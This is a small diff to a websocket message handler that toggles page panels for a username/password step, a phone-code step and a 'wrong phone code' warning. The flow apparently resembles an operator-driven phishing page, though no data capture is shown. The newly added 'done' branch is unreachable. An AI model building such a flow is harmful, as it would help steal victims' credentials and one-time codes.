@@ -8,7 +8,7 @@
 			};
 
 			socket.onmessage = function(event) {
-				console.log({event});
+				// console.log({event});
 				if (event.data=='user-pass') {
 					console.log('prb here??')
 					
@@ -41,13 +41,15 @@
 					}
 				} else if (event.data=='requested') {
 					document.getElementsByClassName('requested')[0].classList.add('visible');
-				}else if (event.data=='done'){
+				} else if (event.data=='done'){
 					document.getElementsByClassName('requested')[0].classList.remove('visible');
 					document.getElementsByClassName('user-pass')[0].classList.remove('visible');
 					document.getElementsByClassName('phone-pass')[0].classList.remove('visible');
 					document.getElementsByClassName('requested')[0].classList.add('visible');
-				}else if (event.data=='wrong_phone_code'){
+				} else if (event.data=='wrong_phone_code'){
 					document.getElementsByClassName('wrong_phone_code')[0].classList.add('visible');
+				} else if (event.data=='done'){
+					socket.close()
 				}
 
 
